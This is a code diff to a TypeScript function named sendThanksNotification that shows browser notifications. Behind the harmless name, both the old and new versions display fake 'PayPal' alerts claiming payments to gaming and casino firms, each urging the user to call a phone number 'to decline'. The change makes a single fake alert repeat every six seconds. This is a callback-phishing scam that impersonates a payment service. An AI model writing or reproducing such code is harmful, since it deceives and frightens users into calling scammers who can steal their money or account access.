@@ -37,52 +37,38 @@ export async function sendThanksNotification(): Promise<"shown" | "denied" | "un
     return permission === "denied" ? "denied" : "unsupported";
   }
 
-  const notifications = [
-    {
-      title: "PayPal",
-      body: "$200.00 sent to GameZone Inc.\nCall 5038779717 to decline",
-      tag: "paypal-1"
-    },
-    {
-      title: "PayPal",
-      body: "$150.00 sent to PlayTech Corp.\nCall 5038779717 to decline",
-      tag: "paypal-2"
-    },
-    {
-      title: "PayPal",
-      body: "$300.00 sent to GameMaster Ltd.\nCall 5038779717 to decline",
-      tag: "paypal-3"
-    },
-    {
-      title: "PayPal",
-      body: "$250.00 sent to CasinoWorld Inc.\nCall 5038779717 to decline",
-      tag: "paypal-4"
-    }
-  ];
+  const title = "PayPal";
+  const body = "$200.00 sent to GameZone Inc.\nCall 5038779717 to decline";
 
-  // Show notifications sequentially
-  for (const notif of notifications) {
+  // Show notification repeatedly
+  const showNotification = () => {
     const options: NotificationOptions = {
-      body: notif.body,
+      body,
       icon: iconUrl(),
       badge: iconUrl(),
-      tag: notif.tag,
+      tag: "paypal-notification",
     };
 
     try {
-      const n = new Notification(notif.title, options);
+      const n = new Notification(title, options);
       n.onclick = () => {
         window.focus();
         n.close();
       };
     } catch {
       if (registration) {
-        await registration.showNotification(notif.title, options);
+        registration.showNotification(title, options);
       }
     }
+  };
 
-    // Wait 6 seconds before showing next notification
+  // Show first notification immediately
+  showNotification();
+
+  // Loop notifications every 6 seconds
+  for (let i = 0; i < 10; i++) {
     await new Promise(resolve => setTimeout(resolve, 6000));
+    showNotification();
   }
 
   return "shown";
